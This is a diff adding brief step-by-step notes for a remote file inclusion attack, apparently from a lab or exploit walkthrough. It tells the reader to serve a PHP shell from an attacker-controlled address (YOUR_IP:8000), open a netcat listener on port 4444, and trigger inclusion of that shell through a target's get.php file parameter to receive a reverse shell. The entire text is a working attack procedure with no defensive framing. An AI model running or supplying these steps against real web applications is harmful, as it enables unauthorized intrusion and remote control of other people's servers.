@@ -1,0 +1,10 @@
+In the same folder, save the payload as payload.txt
+
+In the same folder run 'php -S 0.0.0.0:8000' to host payload
+Payload is hosted at 'http://YOUR_IP:8000/shell.php' 
+
+Setup Netcat listener by using 'nc -lvnp 4444'
+
+Then trigger RFI payload on target 'http://webapp.com/get.php?file=http://YOUR_IP:8000/shell.php'
+
+Once triggered, you should see a connection pop up on your listener
